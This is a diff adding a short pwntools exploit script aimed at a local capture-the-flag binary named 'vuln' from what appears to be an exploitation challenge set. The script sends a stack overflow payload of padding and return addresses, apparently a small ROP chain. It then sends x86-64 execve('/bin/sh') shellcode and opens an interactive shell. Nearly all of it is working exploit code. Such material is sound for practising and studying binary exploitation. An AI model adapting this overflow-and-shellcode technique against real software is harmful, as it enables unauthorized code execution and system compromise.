@@ -1,0 +1,17 @@
+from pwn import p64, u64, p32, u32
+import pwn
+import sys
+        
+pwn.context.log_level = "debug"
+pwn.context.timeout = 20
+p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/11-vuln/vuln")
+pwn.gdb.attach(p)
+payload = b""
+payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb3\x08@\x00\x00\x00\x00\x00\x80\r`\x00\x00\x00\x00\x00 \x06@\x00\x00\x00\x00\x00\x80\r`\x00\x00\x00\x00\x00\n'
+p.send(payload)
+p.recvuntil(b'Welcome, You know what to do. So go get the flag.\n\nHello\n>>> ')
+payload = b""
+payload += b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
+payload += b"\n"
+p.send(payload)
+p.interactive()
